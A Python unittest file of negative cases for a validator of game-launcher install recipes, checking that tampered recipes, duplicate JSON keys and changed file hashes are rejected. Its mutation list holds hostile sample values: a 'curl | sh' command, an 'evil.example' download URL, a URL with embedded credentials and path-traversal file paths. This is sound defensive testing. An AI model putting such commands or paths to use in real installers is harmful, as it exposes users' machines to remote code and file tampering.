"""Negative cases for data that a future remote catalog must reject."""
import copy
import importlib.util
import sys
import unittest
from pathlib import Path

sys.dont_write_bytecode = True
spec = importlib.util.spec_from_file_location('validator', Path(__file__).with_name('validate-launcher-recipes.py'))
validator = importlib.util.module_from_spec(spec)
spec.loader.exec_module(validator)


class RecipeValidationTests(unittest.TestCase):
    def setUp(self):
        self.schema = validator.read(validator.ROOT / 'recipe.schema.json')
        self.ids = {s['id'] for s in validator.read(validator.ROOT / 'index.json')['sources']}
        self.recipe = validator.read(validator.ROOT / 'recipes/ea-app.json')

    def check(self, recipe):
        validator.validate_recipe(recipe, self.schema, self.ids)

    def test_catalog_and_hashes(self):
        self.assertEqual(validator.validate_catalog(), 3)

    def test_reject_untrusted_mutations(self):
        mutations = [
            lambda r: r.update(shell='curl example | sh'),
            lambda r: r['steps'].append('shell'),
            lambda r: r['download'].update(url='http://origin-a.akamaihd.net/setup.msi'),
            lambda r: r['download'].update(url='https://evil.example/setup.msi'),
            lambda r: r['download'].update(url='https://user:secret@origin-a.akamaihd.net/setup.msi'),
            lambda r: r['download'].update(filename='../setup.msi'),
            lambda r: r['executable'].update(relative_paths=['drive_c/../../unrelated.exe']),
            lambda r: r['executable'].update(relative_globs=['drive_c/**/launcher.exe']),
            lambda r: r['runners'][0].update(backend='wine'),
            lambda r: r['dependencies'].append({'verb': 'arbitrary-script', 'evidence': ['ea-recipe'], 'reason': 'test', 'status': 'recipe-candidate', 'apply': 'user-approved'}),
            lambda r: r['download'].update(evidence=['nonexistent']),
            lambda r: r['validation'].update(launch_tested=True),
            lambda r: r['steps'].remove('verify_executable'),
        ]
        for index, mutation in enumerate(mutations):
            with self.subTest(index=index):
                recipe = copy.deepcopy(self.recipe)
                mutation(recipe)
                with self.assertRaises(ValueError):
                    self.check(recipe)

    def test_duplicate_json_keys_rejected(self):
        from tempfile import TemporaryDirectory
        with TemporaryDirectory() as temporary:
            path = Path(temporary) / 'duplicate.json'
            path.write_text('{"id":"safe","id":"replaced"}')
            with self.assertRaises(ValueError):
                validator.read(path)

    def test_index_rejects_changed_recipe_bytes(self):
        import shutil
        from tempfile import TemporaryDirectory
        with TemporaryDirectory() as temporary:
            root = Path(temporary) / 'installers'
            shutil.copytree(validator.ROOT, root)
            path = root / 'recipes/ea-app.json'
            path.write_text(path.read_text() + ' ')
            with self.assertRaisesRegex(ValueError, 'hash mismatch'):
                validator.validate_catalog(root)

    def test_schema_rejects_unknown_keyword(self):
        schema = copy.deepcopy(self.schema)
        schema['unsupported'] = True
        with self.assertRaises(ValueError):
            validator.shape(self.recipe, schema)


if __name__ == '__main__':
    unittest.main()
